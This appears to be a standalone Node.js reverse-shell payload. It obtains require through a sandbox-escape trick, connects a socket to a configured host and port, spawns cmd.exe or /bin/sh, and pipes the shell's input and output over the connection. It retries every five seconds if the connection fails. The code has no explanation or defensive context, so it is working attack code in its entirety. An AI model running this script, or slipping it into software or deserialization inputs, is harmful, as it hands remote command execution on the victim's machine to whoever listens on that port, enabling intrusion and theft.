var require = global.require || global.process.mainModule.constructor._load;
var net = require('net');
var spawn = require('child_process').spawn;

HOST="127.0.0.1";
PORT="1337";
TIMEOUT="5000";

if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }

function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn((process.platform.contains('win')?'cmd.exe':'/bin/sh'),[]);
        client.write("Connected\r\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected\r\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(function() {c(HOST,PORT)}, TIMEOUT);
    });
}

c(HOST,PORT);
